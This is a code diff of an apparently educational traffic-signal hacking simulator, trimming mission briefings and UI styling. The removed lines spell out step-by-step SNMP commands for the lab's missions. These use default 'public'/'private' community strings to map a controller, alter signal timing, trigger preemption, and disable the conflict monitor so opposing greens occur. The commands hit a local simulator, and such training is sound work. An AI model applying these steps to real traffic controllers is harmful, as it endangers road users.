@@ -15,7 +15,6 @@ interface Mission {
   difficulty: string;
   objective: string;
   background: string;
-  steps: string[];
   successCondition: string;
   checkImpact: string[];
 }
@@ -28,37 +27,12 @@ const MISSIONS: Mission[] = [
     objective:
       "Discover the SNMP service, guess the community string, and enumerate all OIDs to map the intersection's control parameters.",
     background:
-      'In 2014, University of Michigan researchers found ~100 traffic controllers with default SNMP credentials accessible over wireless. Community strings like "public" and "private" are factory defaults that are rarely changed.',
-    steps: [
-      "# Step 1: Scan for open UDP ports on the target",
-      "nmap -sU -p 161,162,5020-5030 localhost",
-      "# Look for any open UDP port — SNMP typically runs on 161,",
-      "# but ICS devices often use non-standard ports.",
-      "",
-      "# Step 2: Walk the entire device using default credentials",
-      "# 'public' is the most common factory-default community string.",
-      "# Walk from the MIB root to dump everything the device exposes:",
-      "snmpwalk -v2c -c public localhost:5021 1.3.6.1",
-      "# If data comes back, you've confirmed two things at once:",
-      "#   1. The device speaks SNMP",
-      "#   2. The default 'public' credential was never changed",
-      "",
-      "# Step 3: Read a specific OID to understand the data format",
-      "# Pick one from the walk output and query it directly:",
-      "snmpget -v2c -c public localhost:5021 1.3.6.1.4.1.99999.1.1.1.0",
-      "# Compare the value to the Intersection View — they should match.",
-      "",
-      "# Step 4: Try 'private' — the other common default credential",
-      "# If it works, you may have WRITE access to the controller",
-      "snmpget -v2c -c private localhost:5021 1.3.6.1.4.1.99999.1.6.1.0",
-      "# Same data returned? You now have READ-WRITE access.",
-      "# Check the OID Map above to see which OIDs are writable.",
-    ],
+      'In 2014, University of Michigan researchers wirelessly accessed ~100 traffic signal controllers that were still using default SNMP credentials. Community strings like "public" and "private" are factory defaults that are rarely changed.',
     successCondition:
       'You can read all OIDs with "public" and access writable OIDs with "private". No real authentication.',
     checkImpact: [
-      "No visible impact — this is passive reconnaissance",
-      "Intersection Overview — verify values match what you read",
+      "No visible impact, this is passive reconnaissance",
+      "Intersection Overview: verify values match what you read",
     ],
   },
   {
@@ -69,31 +43,12 @@ const MISSIONS: Mission[] = [
       "Change traffic signal timing to cause gridlock on one direction while giving the other excessive green time.",
     background:
       "Traffic signal timing is critical for traffic flow. Even small changes (5-10 seconds) can cause significant congestion. An attacker with write access can create gridlock across entire corridors.",
-    steps: [
-      '# Attack A: STARVE N-S direction (5s green instead of 30s)',
-      '# Cars barely clear before it turns red again',
-      "snmpset -v2c -c private localhost:5021 \\",
-      "  1.3.6.1.4.1.99999.1.6.1.0 i 5",
-      "",
-      "# Attack B: Give E-W excessive green time (120s)",
-      "snmpset -v2c -c private localhost:5021 \\",
-      "  1.3.6.1.4.1.99999.1.6.2.0 i 120",
-      "",
-      "# Combined: Starve N-S AND boost E-W",
-      "snmpset -v2c -c private localhost:5021 \\",
-      "  1.3.6.1.4.1.99999.1.6.1.0 i 5",
-      "snmpset -v2c -c private localhost:5021 \\",
-      "  1.3.6.1.4.1.99999.1.6.2.0 i 120",
-      "",
-      "# Monitor gridlock level:",
-      "snmpget -v2c -c public localhost:5021 1.3.6.1.4.1.99999.1.4.2.0",
-    ],
     successCondition:
       "N-S queue exceeds 20 cars and gridlock level rises above 40%.",
     checkImpact: [
-      "Intersection View — N-S queue grows rapidly, E-W flows freely",
-      "Signal Controller — gridlock meter rises, queue trend spikes",
-      "Signal Controller — 'Timing Modified' alarm activates",
+      "Intersection View: N-S queue grows rapidly, E-W flows freely",
+      "Signal Controller: gridlock meter rises, queue trend spikes",
+      "Signal Controller: multiple alarms activate",
     ],
   },
   {
@@ -104,29 +59,12 @@ const MISSIONS: Mission[] = [
       "Trigger the emergency vehicle preemption (EVP) system to override normal signal cycling and force one direction to permanent green.",
     background:
       "Emergency preemption allows fire trucks and ambulances to get green lights. Devices like MIRT (Mobile Infrared Transmitter) have been purchased by civilians to abuse this. Our SNMP-based preemption is even easier to trigger.",
-    steps: [
-      "# Trigger N-S preemption (all E-W goes red)",
-      "snmpset -v2c -c private localhost:5021 \\",
-      "  1.3.6.1.4.1.99999.1.8.1.0 i 1",
-      "",
-      "# Watch E-W queue build up (they NEVER get green):",
-      "watch -n 1 'snmpget -v2c -c public localhost:5021 \\",
-      "  1.3.6.1.4.1.99999.1.2.2.0'",
-      "",
-      "# Switch to E-W preemption (now N-S is starved):",
-      "snmpset -v2c -c private localhost:5021 \\",
-      "  1.3.6.1.4.1.99999.1.8.1.0 i 2",
-      "",
-      "# Disable preemption (return to normal cycling):",
-      "snmpset -v2c -c private localhost:5021 \\",
-      "  1.3.6.1.4.1.99999.1.8.1.0 i 0",
-    ],
     successCondition:
       "E-W queue exceeds 30 cars during N-S preemption. Normal cycling is completely suppressed.",
     checkImpact: [
-      "Intersection View — one direction permanently green, other permanently red",
-      "Intersection View — 'PREEMPTION ACTIVE' status displayed",
-      "Signal Controller — preemption alarm triggers, queue imbalance grows",
+      "Intersection View: one direction permanently green, other permanently red",
+      "Intersection View: 'PREEMPTION ACTIVE' status displayed",
+      "Signal Controller: preemption alarm triggers, queue imbalance grows",
     ],
   },
   {
@@ -134,57 +72,15 @@ const MISSIONS: Mission[] = [
     title: "Phase 4: Conflict Monitor Bypass",
     difficulty: "ADVANCED",
     objective:
-      "Disable the safety system (conflict monitor) and then force opposing green lights simultaneously — creating a collision risk at the intersection.",
+      "Disable the safety system (conflict monitor) and then force opposing green lights simultaneously, creating a collision risk at the intersection.",
     background:
-      "This parallels the 2017 TRISIS/Triton attack on a Saudi petrochemical plant. Attackers first disabled the Safety Instrumented System (SIS) before launching the main attack. The conflict monitor is the traffic equivalent — a hardware safety device that detects dangerous states.",
-    steps: [
-      "# Step 1: Hold phase 1 (N-S green stays on)",
-      "snmpset -v2c -c private localhost:5021 \\",
-      "  1.3.6.1.4.1.99999.1.7.1.0 i 1",
-      "",
-      "# Step 2: Activate preemption for E-W (opposite direction)",
-      "# Phase hold wants N-S green, preemption wants E-W green",
-      "# — these are CONFLICTING demands!",
-      "snmpset -v2c -c private localhost:5021 \\",
-      "  1.3.6.1.4.1.99999.1.8.1.0 i 2",
-      "# The conflict monitor catches it → FLASH MODE (safe failure)",
-      "# Verify flash mode is active:",
-      "snmpget -v2c -c public localhost:5021 1.3.6.1.4.1.99999.1.5.2.0",
-      "# Should return INTEGER: 1 (flash mode ON)",
-      "",
-      "# Step 3: Clear the conflict, then DISABLE the safety system",
-      "snmpset -v2c -c private localhost:5021 \\",
-      "  1.3.6.1.4.1.99999.1.8.1.0 i 0",
-      "snmpset -v2c -c private localhost:5021 \\",
-      "  1.3.6.1.4.1.99999.1.7.1.0 i 0",
-      "# Now disable the conflict monitor (the TRISIS/Triton move):",
-      "snmpset -v2c -c private localhost:5021 \\",
-      "  1.3.6.1.4.1.99999.1.9.1.0 i 0",
-      "",
-      "# Step 4: Re-create the conflict — WITH NO SAFETY NET",
-      "snmpset -v2c -c private localhost:5021 \\",
-      "  1.3.6.1.4.1.99999.1.7.1.0 i 1",
-      "snmpset -v2c -c private localhost:5021 \\",
-      "  1.3.6.1.4.1.99999.1.8.1.0 i 2",
-      "# Both directions now have GREEN — COLLISION RISK!",
-      "# Verify conflict detected (no flash mode to save us):",
-      "snmpget -v2c -c public localhost:5021 1.3.6.1.4.1.99999.1.5.3.0",
-      "# Should return INTEGER: 1 (conflict detected, no safe failure)",
-      "",
-      "# To restore safety:",
-      "snmpset -v2c -c private localhost:5021 \\",
-      "  1.3.6.1.4.1.99999.1.9.1.0 i 1",
-      "snmpset -v2c -c private localhost:5021 \\",
-      "  1.3.6.1.4.1.99999.1.8.1.0 i 0",
-      "snmpset -v2c -c private localhost:5021 \\",
-      "  1.3.6.1.4.1.99999.1.7.1.0 i 0",
-    ],
+      "The Conflict Monitor Unit is an independent hardware safeguard that forces the signals to flash red the instant it sees opposing greens, which is why a hacked controller can only jam traffic, never cause a crash. This attack disables that monitor first, then forces the conflict.",
     successCondition:
       "Conflict monitor disabled AND conflict detected (opposing greens with no safe failure). COLLISION RISK displayed.",
     checkImpact: [
-      "Intersection View — with monitor ON: flash mode activates (safe)",
-      "Intersection View — with monitor OFF: COLLISION RISK overlay appears",
-      "Signal Controller — conflict alarm triggers, monitor status shows DISABLED",
+      "Intersection View, monitor ON: flash mode activates (safe)",
+      "Intersection View, monitor OFF: COLLISION RISK overlay appears",
+      "Signal Controller: conflict alarm triggers, monitor status shows DISABLED",
     ],
   },
 ];
@@ -204,11 +100,11 @@ const OID_MAP = [
   { oid: ".4.2.0", name: "gridlock_level", type: "R", defaultVal: "0", desc: "Gridlock (0-100)" },
   { oid: ".5.2.0", name: "flash_mode", type: "R", defaultVal: "0", desc: "Flash mode (0/1)" },
   { oid: ".5.3.0", name: "conflict_detected", type: "R", defaultVal: "0", desc: "Conflict (0/1)" },
-  { oid: ".6.1.0", name: "ns_green_time", type: "RW", defaultVal: "30", desc: "ATTACKABLE — N-S green duration" },
-  { oid: ".6.2.0", name: "ew_green_time", type: "RW", defaultVal: "30", desc: "ATTACKABLE — E-W green duration" },
-  { oid: ".7.1.0", name: "phase_hold", type: "RW", defaultVal: "0", desc: "ATTACKABLE — Hold phase (0=off)" },
-  { oid: ".8.1.0", name: "preemption_active", type: "RW", defaultVal: "0", desc: "ATTACKABLE — Preemption (0/1/2)" },
-  { oid: ".9.1.0", name: "conflict_monitor", type: "RW", defaultVal: "1", desc: "ATTACKABLE — Safety (1=on,0=off)" },
+  { oid: ".6.1.0", name: "ns_green_time", type: "RW", defaultVal: "30", desc: "N-S green duration" },
+  { oid: ".6.2.0", name: "ew_green_time", type: "RW", defaultVal: "30", desc: "E-W green duration" },
+  { oid: ".7.1.0", name: "phase_hold", type: "RW", defaultVal: "0", desc: "Hold phase (0=off)" },
+  { oid: ".8.1.0", name: "preemption_active", type: "RW", defaultVal: "0", desc: "Preemption (0/1/2)" },
+  { oid: ".9.1.0", name: "conflict_monitor", type: "RW", defaultVal: "1", desc: "Safety (1=on,0=off)" },
 ];
 
 export function TrafficLabMonitor({
@@ -337,11 +233,11 @@ export function TrafficLabMonitor({
       </div>
 
       <div className="grid grid-cols-3 gap-3">
-        {/* Left: Mission briefing + commands */}
+        {/* Left: Mission briefing */}
         <div className="col-span-2 space-y-3">
           <div className="bg-gray-900 rounded-lg p-4 border border-gray-800">
             <div className="flex justify-between items-start mb-3">
-              <h2 className="font-mono text-sm font-bold text-gray-200">
+              <h2 className="font-mono text-base font-bold text-gray-200">
                 {mission.title}
               </h2>
               <span
@@ -361,14 +257,14 @@ export function TrafficLabMonitor({
               <h3 className="text-xs font-mono text-amber-400 mb-1">
                 OBJECTIVE
               </h3>
-              <p className="text-xs text-gray-300">{mission.objective}</p>
+              <p className="text-sm text-gray-300 leading-relaxed">{mission.objective}</p>
             </div>
 
             <div className="mb-3">
               <h3 className="text-xs font-mono text-gray-500 mb-1">
                 BACKGROUND
               </h3>
-              <p className="text-xs text-gray-400 italic">
+              <p className="text-sm text-gray-400 italic leading-relaxed">
                 {mission.background}
               </p>
             </div>
@@ -377,7 +273,7 @@ export function TrafficLabMonitor({
               <h3 className="text-xs font-mono text-green-400 mb-1">
                 SUCCESS CONDITION
               </h3>
-              <p className="text-xs text-green-300">
+              <p className="text-sm text-green-300 leading-relaxed">
                 {mission.successCondition}
               </p>
             </div>
@@ -386,7 +282,7 @@ export function TrafficLabMonitor({
               <h3 className="text-xs font-mono text-blue-400 mb-1">
                 WHERE TO CHECK IMPACT
               </h3>
-              <ul className="text-xs text-gray-400 space-y-1">
+              <ul className="text-sm text-gray-400 space-y-1">
                 {mission.checkImpact.map((item, i) => (
                   <li key={i} className="flex gap-2">
                     <span className="text-blue-500">-</span> {item}
@@ -394,15 +290,6 @@ export function TrafficLabMonitor({
                 ))}
               </ul>
             </div>
-          </div>
-
-          <div className="bg-black rounded-lg p-4 border border-gray-800">
-            <h3 className="text-xs font-mono text-green-400 mb-2 font-bold">
-              COMMANDS — Run these in your terminal
-            </h3>
-            <pre className="text-xs font-mono text-gray-300 overflow-x-auto whitespace-pre">
-              {mission.steps.join("\n")}
-            </pre>
           </div>
         </div>
 
